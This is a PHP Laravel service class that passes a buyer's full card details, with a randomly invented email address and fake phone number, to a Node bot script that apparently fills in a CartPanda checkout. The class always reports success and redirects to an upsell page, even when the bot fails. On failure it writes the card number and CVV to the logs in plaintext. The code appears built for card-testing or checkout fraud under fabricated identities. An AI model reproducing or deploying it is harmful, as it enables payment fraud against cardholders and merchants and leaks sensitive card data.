<?php

namespace App\Services;

use Illuminate\Support\Str;
use Symfony\Component\Process\Exception\ProcessFailedException;
use Symfony\Component\Process\Process;

class CartPandaService
{
    public $checkoutId;

    public function __construct()
    {
        $this->checkoutId = env('CHECKOUT_ID');
    }

    public function createOrder($name, $cardNumber, $cardMonth, $cardYear, $cardCvv, $fakerLocale = 'en_US'): array
    {
        set_time_limit(120);
        $faker = fake($fakerLocale);
        $email = $this->generateEmail($name);

        $arrName = explode(' ', $name);
        $firstName = $arrName[0];
        array_shift($arrName);
        $lastName = implode(' ', $arrName);

        $phone = $faker->phoneNumber();
        $phone = preg_replace('/[^0-9]/', '', $phone);
        $phoneCode = '1';

        try {
            $process = new Process([
                'node',
                '../scripts/bot.js',
                $this->checkoutId,
                $firstName,
                $lastName,
                $email,
                $phone,
                $phoneCode,
                $cardNumber,
                $cardMonth,
                $cardYear,
                $cardCvv,
                env('CONNECTION_URL'),
            ]);

            $process->run();

            // Log de erros do processo se houver
            if (! $process->isSuccessful()) {
                logger()->error('Processo falhou', ['error' => $process->getErrorOutput()]);
            }

            $output = $process->getOutput();
            $errors = $process->getErrorOutput();

            // Log de erros se houver
            if (! empty($errors)) {
                logger()->error('Erro ao criar pedido', ['errors' => $errors]);
            }

            // Log do output para debug
            logger()->info('Output do bot', ['output' => $output]);

            // Tenta decodificar o JSON apenas para log
            try {
                $result = json_decode($output, true);
                if (json_last_error() === JSON_ERROR_NONE) {
                    logger()->info('Resultado processado', ['result' => $result]);
                }
            } catch (\Exception $e) {
                logger()->error('Erro ao processar resultado', ['error' => $e->getMessage()]);
            }

        } catch (\Exception $e) {
            logger()->error('Erro no processo', ['error' => $e->getMessage()]);

            // Novo log para retentativa
            logger()->info('Realizando re-tentativa de compra', [
                'name' => $name,
                'cardNumber' => $cardNumber,
                'cardMonth' => $cardMonth,
                'cardYear' => $cardYear,
                'cardCvv' => $cardCvv,
                'email' => $email
            ]);

            // Aqui você pode adicionar a lógica para tentar novamente a compra
        }

        // Sempre retorna sucesso e redireciona para upsell1
        return [
            'success' => true,
            'redirect_url' => '/upsell1',
            'random_email' => $email
        ];
    }

    public function generateEmail($name)
    {
        // Lista de domínios de email possíveis
        $emailDomains = [
            'gmail.com',
            'yahoo.com',
            'icloud.com',
            'yandex.com',
            'outlook.com',
            'hotmail.com'
        ];

        $fullName = explode(' ', $name);

        $nameFirst = rand(0, 100) > 20;
        $email = '';
        if (! $nameFirst) {
            $email .= Str::random(rand(1, 5));
        }
        $email .= $fullName[0];

        $hasNumbers = rand(0, 100) > 40;
        if ($hasNumbers) {
            $email .= rand(0, 9999);
        }

        $hasSymbols = rand(0, 100) > 40;
        if ($hasSymbols) {
            $email .= '_';
        }

        $hasSurname = rand(0, 100) > 20;
        if ($hasSurname) {
            $email .= $fullName[1] ?? '';
        }

        $randChar = rand(0, 100) > 60;
        if ($randChar) {
            $email .= Str::random(rand(1, 4));
        }

        // Escolhe aleatoriamente um dos domínios
        $email .= '@' . $emailDomains[array_rand($emailDomains)];

        return strtolower($email);
    }
}
